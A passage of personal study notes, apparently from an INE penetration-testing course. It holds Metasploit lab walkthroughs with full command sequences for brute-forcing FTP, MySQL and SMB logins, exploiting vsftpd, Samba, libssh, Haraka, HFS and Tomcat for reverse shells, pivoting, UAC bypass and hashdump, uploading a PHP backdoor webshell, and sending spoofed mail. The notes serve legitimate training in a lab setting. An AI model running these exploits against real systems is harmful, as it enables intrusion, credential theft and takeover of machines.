        #Expand the Hypertext Transfer Protocol section and copy the User-Agent
        FLAG 5: WindowsPowerShell
        
        //Flag6
        #To find this, press CTRL+F to search. In the String parameter, type Coinbase and search using Packet Bytes on the left side of the Find functionality.
        Press enter or click to view image in full size
        #Here, we found some details for Coinbase. Right-click the main request and select Follow > TCP Stream Ctrl+Alt+Shift+T.
        FLAG 6: hnfanknocfeofbddgcijnmhnfnkdnaad
        
        ```
        
    
    ```bash
    SNMB
    ```
    
    Tshark
    
    Filtering Basics HTTP
    
    ARP poisoning
    
    Wifi Traffic Analyses
    

- **MSF**
    
    **Labs:**
    
    - **Importing Nmap Scan Results Into MSF**
        
        n this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at **demo.ine.local** running a vulnerable RDP service.
        
        **Objective:** To import Nmap scan results into MSF
        
        Tools: namp, msfconsole
        
        ```bash
        nmap -sV -Pn -oX myscan.xml demo.ine.local
        service postgresql start
        msfconsole
        db_status
        db_import myscan.xml
        hosts
        services
        ```
        
    - **T1046: Network Service Scanning**
        
        In this lab, we are given access to a Kali machine. There are two target machines, one on the same network i.e. **demo1.ine.local**. This target machine is vulnerable and can be exploited using the following information. Use this information to retrieve services running on the second target machine and complete the mission!
        
        **Vulnerability Information**
        
        **Vulnerability:** XODA File Upload Vulnerability
        
        **Metasploit module:** exploit/unix/webapp/xoda_file_upload
        
        **Objective:** - Identify the ports open on the second target machine using appropriate Metasploit modules. - Write a bash script to scan the ports of the second target machine. - Upload the nmap static binary to the target machine and identify the services running on the second target machine
        
        Tools: msf, bash, terminal, namp
        
        **How many services are running on the second target machine?**
        
        ```bash
        
        nmap demo1.ine.local
        # port 80: As mentioned in the challenge, a XODA web app instance is running on the system which can be exploited using the “exploit/unix/webapp/xoda_file_upload” Metasploit module.
        curl demo1.ine.local
        msfconsole
        use exploit/unix/webapp/xoda_file_upload
        set RHOSTS demo1.ine.local
        set TARGETURI /
        set LHOST 192.63.4.2
        exploit
        #meterpreter session is spawned on the target machine
        #start a command shell and identify ip add range of the seocnd target  machine
        shell
        ip addr
        #The IP address of the first target machine on its eth1 interface is 192.180.108.2, the second target machine will be located at 192.180.108.3 on the second network.
        
        run autoroute -s 192.180.108.2
        #background the current meterpreter session and use portscan tcp module of msf to scan the 2nd target machine
        #ctrl+z and enter y to background the meterpreter session
        
        #Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine.
        
        use auxiliary/scanner/portscan/tcp
        set RHOSTS 192.180.108.3
        set verbose false
        set ports 1-1000
        exploit 
        
        **$ls -al /root/static-binaries/nmap
        file /root/static-binaries/nmap
        #check the static binaries available in the /usr/bin/ directory**
        
        nano bash-port-scanner.sh
        // 
        #!/bin/bash
        for port in {1..1000}; do
         timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
        done
        //#bash port scanning script https://catonmat.net/tcp-port-scanner-in-bash
        cat bash-port-scanner.sh
        
        #Foreground the Metasploit session and switch to the meterpreter session.
        Press "fg" and press enter to foreground the Metasploit session.
        
        sessions -i 1
        meterpreter> upload /root/static-binaries/nmap /tmp/nmap
        meterpreter> upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
        #Upload the nmap static binary and the bash port scanner script to the target machine.
        
        #make your binary and script executable and use the bash script to scan the second target machine
        shell
        cd /tmp/
        chmod +x ./nmap ./bash-port-scanner.sh
        ./bash-port-scanner.sh 192.180.108.3
        
        ./nmap -p- 192.180.108.3
        
        #using the nmap binary, scan the target machine for open port
        
        ```
        
    - **FTP Enumeration**
        
        FTP (File Transfer Protocol) is a standard network protocol used for transferring files from one host to another over a network. FTP operates in a client-server architecture, where the client initiates a connection to the server to perform file operations.
        
        This lab covers the process of performing FTP enumeration with Metasploit.
        
        n this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to perform FTP enumeration with Metasploit.
        
        **Tools: msf, FTP client , port 21**
        
        ```bash
        msfconsole
        use auxiliary/scanner/ftp/ftp_version
        set RHOSTS demo.ine.local
        run
        
        use auxiliary/scanner/ftp/ftp_login
        set RHOSTS demo.ine.local
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        run
        
        #As shown in the following screenshot, the brute force attack identifies the credentials sysadmin:654321
        #We can also check if anonymous logons are allowed on the FTP server, this can be done by using the following commands:
        
        use auxiliary/scanner/ftp/anonymous
        set RHOSTS demo.ine.local
        run
        
        ftp demo.ine.local
        #As shown in the following screenshot, you will be prompted to provide a username and password, supply the credentials we obtained from the brute force attack.
        ```
        
        In this lab, we explored the process of performing FTP enumeration with the Metasploit Framework.
        
    - **Apache Enumeration**
        
        Apache enumeration is a crucial step in the reconnaissance phase of a penetration test, where the goal is to gather as much information as possible about the Apache web server being targeted. This information can help in identifying potential vulnerabilities or misconfigurations that can be exploited later in the test. In this lab, we will learn about Apache enumeration using the Metasploit framework modules.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at "victim-1".
        
        **Objective:** Run the following auxiliary modules against the target (victim-1):
        
        - auxiliary/scanner/http/apache_userdir_enum
        - auxiliary/scanner/http/brute_dirs
        - auxiliary/scanner/http/dir_scanner
        - auxiliary/scanner/http/dir_listing
        - auxiliary/scanner/http/http_put
        - auxiliary/scanner/http/files_dir
        - auxiliary/scanner/http/http_login
        - auxiliary/scanner/http/http_header
        - auxiliary/scanner/http/http_version
        - auxiliary/scanner/http/robots_txt
        
        **Tools: msf**
        
        ```bash
        ping -c 5 victim-1
        msfconsole -q
        use auxiliary/scanner/http/http_version
        set RHOSTS victim-1
        run
        
        use auxiliary/scanner/http/robots_txt
        set RHOSTS victim-1
        run
        
        use auxiliary/scanner/http/http_header
        set RHOSTS victim-1
        run
        
        use auxiliary/scanner/http/http_header
        set RHOSTS victim-1
        set TARGETURI /secure
        run
        
        use auxiliary/scanner/http/brute_dirs
        set RHOSTS victim-1
        run
        
        use auxiliary/scanner/http/dir_scanner
        set RHOSTS victim-1
        set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
        run
        
        use auxiliary/scanner/http/dir_listing
        set RHOSTS victim-1
        set PATH /data
        run
        
        use auxiliary/scanner/http/files_dir
        set RHOSTS victim-1
        set VERBOSE false
        run
        
        use auxiliary/scanner/http/http_put
        set RHOSTS victim-1
        set PATH /data
        set FILENAME test.txt
        set FILEDATA "Welcome To AttackDefense"
        run
        
        wget http://victim-1:80/data/test.txt 
        cat test.txt
        
        use auxiliary/scanner/http/http_put
        set RHOSTS victim-1
        set PATH /data
        set FILENAME test.txt
        set ACTION DELETE
        run
        
        wget http://victim-1:80/data/test.txt 
        
        use auxiliary/scanner/http/http_login
        set RHOSTS victim-1
        set AUTH_URI /secure/
        set VERBOSE false
        run
        
        use auxiliary/scanner/http/apache_userdir_enum
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set RHOSTS victim-1
        set VERBOSE false
        run
        
        ```
        
        In this lab, we learned about Apache enumeration using the Metasploit framework modules.
        
    - **MySQL Enumeration**
        
        MySQL is an open-source relational database management system (RDBMS). It is one of the most widely used database systems in the world and is commonly used in web applications and is a central component of the LAMP stack (Linux, Apache, MySQL, PHP/Python/Perl). The default port for MySQL server is 3306. This port is used for client-server communication in MySQL database management systems.
        
        In this lab, we will take a look at different auxiliary modules in Metasploit related to MySQL that we can run against the target to gather sensitive information.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a MySQL service will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to run the following auxiliary modules against the target:
        
        - auxiliary/scanner/mysql/mysql_version
        - auxiliary/scanner/mysql/mysql_login
        - auxiliary/admin/mysql/mysql_enum
        - auxiliary/admin/mysql/mysql_sql
        - auxiliary/scanner/mysql/mysql_file_enum
        - auxiliary/scanner/mysql/mysql_hashdump
        - auxiliary/scanner/mysql/mysql_schemadump
        - auxiliary/scanner/mysql/mysql_writable_dirs
        
        Tools: nmap , msf
        
        ```bash
        
        ping -c 4 demo.ine.local
        nmap demo.ine.local
        #port 3306 mysql
        
        msfconsole -q
        use auxiliary/scanner/mysql/mysql_version
        set RHOSTS demo.ine.local
        run
        
        use auxiliary/scanner/mysql/mysql_login
        set RHOSTS demo.ine.local
        set USERNAME root
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set VERBOSE false
        run
        
        use auxiliary/admin/mysql/mysql_enum
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS demo.ine.local
        run
        
        use auxiliary/admin/mysql/mysql_sql
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS demo.ine.local
        run
        
        use auxiliary/scanner/mysql/mysql_file_enum
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS demo.ine.local
        set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
        set VERBOSE true
        run
        
        use auxiliary/scanner/mysql/mysql_hashdump
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS demo.ine.local
        run
        
        use auxiliary/scanner/mysql/mysql_schemadump
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS demo.ine.local
        run
        
        use auxiliary/scanner/mysql/mysql_writable_dirs
        set RHOSTS demo.ine.local
        set USERNAME root
        set PASSWORD twinkle
        set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
        run
        ```
        
        In this lab, we explored different MySQL related metasploit modules that we can run against the target and gather sensitive information.
        
    - **Postfix Recon: Basics**
        
        An SMTP (Simple Mail Transfer Protocol) server is a mail server that sends and receives emails using the SMTP protocol. It's responsible for sending, receiving, and relaying outgoing mail between email senders and recipients.
        
        In this lab we will look at the basics of Postfix SMTP server reconnaissance.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Answer the following questions:
        
        1. What is the SMTP server name and banner.
        2. Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
        3. Does user “admin” exist on the server machine? Connect to SMTP service using netcat and check manually.
        4. Does user “commander” exist on the server machine? Connect to SMTP service using netcat and check manually.
        5. What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.
        6. How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.
        7. How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
        8. Connect to SMTP service using telnet and send a fake mail to root user.
        9. Send a fake mail to root user using sendemail command.
        
        **Tools: nmap, telnet, nc msf**
        
        ```bash
        nmap -sV -script banner demo.ine.local
        #port 25 smtp version:Postfix
        #Banner: openmailbox.xyz ESMTP Postfix: Welcome to our mail server
        #
        # Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
        //domain name: openmailbox.xyz
        nc demo.ine.local 25
        #Does user "admin" exist on the server machine? Connect to SMTP service using netcat and check manually.
        answer: yes
        VRFY admin@openmailbox.xyz
        #What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.
        telnet demo.ine.local 25
        HELO attacker.xyz
        EHLO attacker.xyz
        #got 8 common username
        smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
        #got 22 common username
        
        msfconsole -q
        use auxiliary/scanner/smtp/smtp_enum
        set RHOSTS demo.ine.local
        exploit
        
        #Connect to SMTP service using telnet and send a fake mail to root user.
        telnet demo.ine.local 25
        HELO attacker.xyz
        mail from: admin@attacker.xyz
        rcpt to:root@openmailbox.xyz
        data
        Subject: Hi Root
        Hello,
        This is a fake mail sent using telnet command.
        From,
        Admin
        .
        #Send a fake mail to root user using sendemail command.
        
        sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
        
        ```
        
        In this lab, we looked at the basics of Postfix SMTP server reconnaissance.
        
    - **Windows: HTTP File Server**
        
        An HTTP File Server (HFS) is a server application that facilitates file sharing over the HTTP protocol. It allows users to upload, download, and manage files via a web interface. HFS can be used for both personal and professional purposes to share files easily over a network. In this lab, we will see how an HFS server application can be exploited.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.
        
        **Objective:** Exploit the application and retrieve the flag!
        
        Tools: nmap , msf
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #port 80, version:HttpFileServer httpd 2.3
        search HttpFileServer
        use 0 or
        use exploit/windows/http/rejetto_hfs_exec
        show options
        set rhosts demo.ine.local
        run
        #got meterpreter 
        shell
        cd C:\
        type flag.txt
        #got the flag
        
        ```
        
    - **Windows: Java Web Server**
        
        Apache Tomcat is a Java web server that primarily serves as a servlet container, which means it provides an environment for running Java-based web applications. In this lab, we will identify a vulnerability in the Tomcat server and exploit it using a suitable Metasploit module.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable java web server will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.
        
        **Objective:** Exploit the application and retrieve the flag!
        
        **Tools: nmap, msf, firefox**
        
        ```bash
        #port 8080 Apache Tomcat 8.5.19
        nmap -Pn -A -T4 demo.ine.local
        
        msfconsole
        search apache tomcat
        use 42 or
        use exploit/multi/http/tomcat_jsp_upload_bypass
        set rhosts demo.ine.local
        run
        
        #GOT THE SHELL
        cd C:\
        type flag.txt
        
        ```
        
    - ***CTF 1***
        
        Windows systems are common targets in penetration testing due to their extensive use in corporate environments. This lab focuses on exploiting Windows-based services and configurations using the Metasploit Framework (MSF). Participants will gain hands-on experience accessing vulnerable services, exploring sensitive directories, and escalating privileges to retrieve hidden information.
        
        The objective is to highlight the risks associated with misconfigured accounts, exposed directories, and improper privilege management in Windows environments.
        
        Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
        
        In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.
        
        **Objective:** Use Metasploit and manual investigation techniques to capture the following flags:
        
        - **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
        - **Flag 2:** Locate the second flag within the Windows configuration folder.
        
        - **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
        
        ```bash
        **//Flag1**
        service postgresql start
         msfconsole -q
        db_status
        #verified msf database connection
        db_nmap -p 1433 -sV target.ine.local -sC -O — osscan-guess
        
        #Port 1433 was open, confirming an MSSQL service.
        Identified the version as Microsoft SQL Server 2012 and searched for related exploits. The most relevant exploit was marked Excellent.
        Press enter or click to view image in full size
        
        msf6> **search Microsoft SQL Server 2012**
        use 0 
        or 
        use exploit/windows/mssql/mssql_clr_payload
        **set payload windows/x64/meterpreter/reverse_tcp**
        set RHOSTS target.ine.local
        run
        
        #got the meterpreter sessions
        shell 
        cd C:\
        dir
        type flag1.txt
        
        **//Flag2**
        C:\Windows\System32\config 
        #access denied
        exit
        **meterpreter>getprivs
        #Discovered the SeImpersonatePrivilege
        getsystem
        #Used privilege escalation via:**
        
        #Spawned a new shell and successfully accessed the config directory:
        
        shell
         cd C:\Windows\System32\config
         dir
         type flag2.txt
         
         **//Flag3**
         #Hint: The file is hidden somewhere in System32
         shell
         C:\> dir C:\Windows\System32\*.txt /s /b
         type C:\Windows\System32\drivers\escaltePrivilegeToGetThisFlag.txt
         
         **//Flag4**
         
         #Hint: Investigate the Administrator account.
         cd C:\Users\Administrator\Desktop
         dir
         type flag4.txt
        
        ```
        
        - **Flag 4:** Investigate the Administrator directory to find the fourth flag.
        
        **Tools: nmap, msf , mssql**
        
    
    - **Vulnerable FTP Server**
        
        VSFTPD (Very Secure FTP Daemon) is a FTP server software for Unix-like systems designed to be fast and lightweight while providing essential features for file transfer operations.
        
        In this lab, we will look at how to exploit a vulnerable FTP server using the Metasploit Framework.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable FTP server will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the server using suitable Metasploit module and get a shell on the target.
        
        Tools: nmap, msf
        
        ```bash
        #21/tcp open  ftp     vsftpd 2.3.4
        nmap -Pn -A -T4 demo.ine.local
        nmap -p 21 --script vuln demo.ine.local
        
        msfconsole
        search vsftpd
        use 1
        or
        use exploit/unix/ftp/vsftpd_234_backdoor
        show options
        set rhosts demo.ine.local
        exploit
        #got shell
        
        ```
        
    - **Vulnerable File Sharing Service**
        
        Samba is a free software re-implementation of the SMB (Server Message Block) networking protocol, and it provides file and print services for various Microsoft Windows clients and can integrate with a Windows Server domain, either as a Primary Domain Controller (PDC) or as a domain member. In this lab, we will see how a vulnerable file-sharing service can be exploited.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using command line tools available on the Kali terminal and then exploit the application using the appropriate Metasploit module. Get a shell on the target!
        
        **Objective:** Get a shell on the target by exploiting a file-sharing service.
        
        Tools: nmap , msf
        
        ```bash
        
        nmap -Pn -A -T4 demo.ine.local
        #port 139, 445 samba smbd
        
        msfconsole -q
        search type:exploit name : samba
        use exploit/linux/samba/is_known_pipename
        set RHOST demo.ine.local
        check
        exploit
        id
        
        # successfully obtain shell and In this lab, we learned how to get a shell on the target by exploiting a file-sharing service.
        
        ```
        
    - **Vulnerable SSH server**
        
        SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.
        
        In this lab, we will look at how to exploit a vulnerable SSH server.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable SSH #port 22 server will be accessible at **demo.ine.local**.
        
        **Objective:** Get a shell on the target by exploiting the vulnerable server using a suitable Metasploit module.
        
        Tools: nmap , msf
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
        msfconsole
        search libssh
        use 0
        or
        use auxiliary/scanner/ssh/libssh_auth_bypass
        set RHOSTS demo.ine.local
        set SPAWN_PTY true
        exploit
        
        sessions -i 1
        
        id
        ```
        
    - **Vulnerable SMTP Server**
        
        In this lab, you will see how to fingerpint and exploit a vulnerable SMTP server using an appropriate Metasploit module to gain a shell on the target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to fingerprint the application using command line tools available in Kali and then exploit the application using the appropriate Metasploit module. Get a shell on the target!
        
        **Tools: nmap , msf**
        
        ```bash
         nmap -Pn -A - T4 demo.ine.local
        #25/tcp open  smtp    Haraka smtpd 2.8.8
        
        msfconsole
        search haraka
        use 0
        or
        use exploit/linux/smtp/haraka
        show options
        
        use exploit/linux/smtp/haraka
        set SRVPORT 9898
        set email_to root@attackdefense.test
        set payload linux/x64/meterpreter_reverse_http
        set rhost demo.ine.local
        set LHOST 192.164.31.2
        exploit
        
        #got meterpreter sessions
        sessions 
        sessions 1
        meterpreter>getuid, sysinfo
        
        ```
        
    - ***CTF 2***
        
        Linux-based systems are frequently targeted in penetration tests due to their prevalence in server environments. This lab focuses on using the Metasploit Framework (MSF) to exploit misconfigured services and vulnerable applications on Linux systems. Participants will leverage MSF to enumerate services, explore file systems, and exploit web applications to achieve shell access.
        
        In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at **target1.ine.local** and **target2.ine.local**.
        
        **Objective:** Using various exploration techniques, complete the following tasks to capture the associated flags:
        
        - **Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
        - **Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
        - **Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
        - **Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.
        
        **Tools: nmap , msf, rsync**
        
        ```bash
        **//Flag1**
        
        nmap -Pn -A -T4 target1.ine.local
        #873/tcp open  rsync   (protocol version 31)  
        service postgresql start 
        msfconsole -q
        workspace -a target1
        db_nmap -sV target1.ine.local
        
        msf6> rsync rsync://target1.ine.local
        
        **//Flag2**
        
        msf6> rsync -av rsync://target1.ine.local/backupwscohen/ .
        msf6> cat pii_data.xlsx
        
        **//Flag3**
        
        workspace -a target2
        setg RHOSTS target2.ine.local
        db_nmap -sV target2.ine.local
        #Found a web service running and observed Roxy-Wi in the hostname.
        #Searched for a matching Metasploit module:
        search roxy-wi
        use exploit/linux/http/roxy_wi_exec
        set rhosts target2.ine.local
        set LHOST target2.ine.local
        run
        #got meterpreter
        shell
        cd /
        ls
        cat flag.txt
        
        **//Flag4**
        meterpreter>
        cd /etc/cron.d
        ls
        cat www-data-cron
        
        ```
        
    
    - **Meterpreter Basics**
        
        Meterpreter, short for "Meta-Interpreter," is an advanced, dynamically extensible payload used within the Metasploit Framework, a popular penetration testing tool. Meterpreter provides an interactive shell that allows attackers to execute commands and scripts on a compromised system. In this lab, the target server is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Perform the following tasks to complete the lab:
        
        1. Check the present working directory on remote (exploited) machine.
        2. List the files present in present working directory of the remote machine.
        3. Check the present working directory on local (attacker) machine.
        4. List the files present in present working directory of the local machine.
        5. Get the flag value present in /app/flag1 file.
        6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
        7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
        8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
        9. Delete the .zip file from the directory.
        10. Print checksum of file mentioned in the extracted file (Refer to Q8).
        11. Check the PATH environment variable on the remote machine.
        12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
        13. Change to tools directory on the local machine.
        14. Upload a PHP webshell to app directory of the remote machine.
        
        **Tools: nmap, msf**
        
        ```bash
        
        nmap -sS -sV demo.ine.local
        #We will scan the target using dirb tool.
        dirb http://demo.ine.local
        #We will access phpinfo.php file using curl to find more information about the web server.
        curl http://demo.ine.local/phpinfo.php
        #The **xdebug** extension is enabled on target server. We can exploit it using exploit/unix/http/xdebug_unauth_exec metasploit module.
        
        msfconsole -q 
        **use exploit/unix/http/xdebug_unauth_exec**
        set RHOSTS demo.ine.local
        set LHOST <Attacker Kali Machine IP>
        exploit
        #got meterpreter 
        pwd
        ls
        lpwd        #working directory in local
        lls     #list the files present in present working direcotry of the local machine
        cat /app/flag1
        
        #Change the flag value present in /app/flag1, so that no one else can get the right flag.
        edit /app/flag1
        cat /app/flag1
        #Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
        cd "Secret Files"
        ls
        cat .flag2
        
        cd /app
        download flag5.zip
        
        #Open a new Terminal$
        ls
        unzip flag5.zip
        cat list
        #delete the .zip from the directory > meterpreter>
        rm flag5.zip
        
        #Print checksum of file mentioned in the extracted file (Refer to Q8).
        meterpreter> checksum md5 /bin/bash
        #Check the PATH environment variable on the remote machine.
        getenv PATH
        
        #There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
        search -d /usr/bin -f *ckdo*
        lcd /root/Desktop/tools
        #Change to tools directory on the local machine.
        
        upload /usr/share/webshells/php/php-backdoor.php
        #Upload a PHP webshell to app directory of the remote machine.
        
        ```
        
    - **Upgrading Command Shells To Meterpreter Shells**
        
        Upgrading a command shell to a Meterpreter shell in Metasploit is a powerful technique during penetration testing, as Meterpreter provides advanced features that are not available in a standard command shell. Meterpreter is a sophisticated payload that provides an interactive shell and allows for extensive post-exploitation activities, such as file system browsing, process manipulation, and network pivoting. This lab covers the process of upgrading a command shell to a meterpreter session.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable service will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the vulnerable service using suitable Metasploit module and then upgrade the command shell session to a meterpreter session.
        
        **Tools: nmap , msf**
        
        ```bash
        nmap -sV demo.ine.local
        #the Nmap scan reveals a vulnerable version of SAMBA running on port 445 that can be exploited through the use of a Metasploit module.
        
        msfconsole
        use exploit/linux/samba/is_known_pipename
        set RHOSTS demo.ine.local
        exploit
        
        #got shell
        whoami
        pwd
        #upgrading shell to meterpreter shell
        
        CTRL + Z
        #msf
        use post/multi/manage/shell_to_meterpreter
        set SESSION 1
        set LHOST 192.212.191.2
        run 
        sessions 2
        #meterpreter
        ```
        
    - **Windows Post Exploitation Modules**
        
        This lab covers the process of automating various phases of post-exploitation through the use of various Metasploit modules.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to run various Windows Post Exploitation Metasploit modules against the compromised target.
        
        **Tools: nmap msf**
        
        ```bash
        nmap -sV demo.ine.local
         searchsploit HttpFileServe
        #The target system has a vulnerable version of the Rejetto HTTP File Server running on port 80 that can be exploited through the use of a Metasploit module.
        
        msfconsole -q
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        run
        #got meterpreter sessions
        background
        
        #The first module we can explore is the win_privs module, which can be used to automate the enumeration of the current user privileges. We can load the module, configure the SESSION option and then run it using the following commands:
        use post/windows/gather/win_privs
        set SESSION 1
        run
        
        #The next module we can use is the enum_logged_on_users which as the name suggests, enumerates a list of currently and previous logged on users. Run the module:
        use post/windows/gather/enum_logged_on_users
        set SESSION 1
        run
        
        #We can also check if the target system is a virtual machine by leveraging a module called checkvm. This module will tell you whether the target system is a VM or container. Run the module:
        use post/windows/gather/checkvm
        set SESSION 1
        run
        
        #Another important module is the enum_applications module. This module enumerates a list of installed application/programs on the target system. Run the module:
        use post/windows/gather/enum_applications
        set SESSION 1
        run
        
        #We can utilize the enum_computers module to enumerate a list of computers connected to the same LAN that the target is a part of. Try running the module:
        use post/windows/gather/enum_computers
        set SESSION 1
        run
        # the module reveals that the target system is not part of a Windows domain.
        
        #We can also enumerate a list of shares by using the enum_shares module. Run the module:
        use post/windows/gather/enum_shares
        set SESSION 1
        run
        
        ```
        
        In this lab, we explored the process of automating post exploitation on a Windows target system by leveraging various post-exploitation Metasploit modules.
        
    - **UAC Bypass: Memory Injection (Metasploit)**
        
        In this lab, we will look at how to bypass UAC [[https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)] using the Memory Injection Metasploit local exploit module
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable server will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. And then, bypass UAC using the Memory Injection Metasploit local exploit module.
        
        **Objective:** Gain the highest privilege on the compromised machine and get administrator user NTLM hash.
        
        **Tools: nmap, msf**
        
        ```bash
        nmap demo.ine.local
        nmap -sV -p 80 demo.ine.local
        #HTTP File Server (HFS) 2.3 is available.
        searchsploit hfs
        #Rejetto HTTP File Server (HFS) 2.3 is vulnerable to RCE. Exploiting the target server using the Metasploit framework.
        
        msfconsole -q
        
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit
        #got meterpreter
        getuid   # not NT authority need escalate priv
        sysinfo
        
        #We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.
        ps -S explorer.exe
        migrate 2124
        #Please note the explorer.exe arch is x64 bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.
        
        #Elevate to the high privilege:
        getsystem
        #We can observe that we do not have permission to elevate privileges.
        #Get a windows shell and check if the admin user is a member of the Administrators group.
        shell
        net localgroup administrators
        
        #This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.”
        CTRL + C
        background
        #run UAC bypass in memory injection module
        
        use exploit/windows/local/bypassuac_injection
        set session 1
        set TARGET 1
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        exploit
        #got meterpreter session 
        getsystem
        getuid     #not high priv like NT auth
        
        ps
        ps -S lsass.exe
        migrate 484     #got high priv
        hashdump
        #got flag administrator second : part hash part flag
        
        ```
        
    - **Exploiting SMB with PsExec**
        
        SMB (Server Message Block) is a network file sharing protocol that allows applications and users to read and write to files and request services from server programs in a computer network. In this lab we will learn the process of exploiting SMB with PsExec.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the SMB service with PsExec and retrieve the flag.
        
        Tools: nmap, msf
        
        ```bash
        nmap demo.ine.local
        nmap -p445 --script smb-protocols demo.ine.local
        
        msfconsole -q
        use auxiliary/scanner/smb/smb_login
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set RHOSTS demo.ine.local
        set VERBOSE false
        exploit
        
        #We have found four valid users and their passwords.
        #Running psexec module to gain the meterpreter shell.
        msfconsole -q
        use exploit/windows/smb/psexec
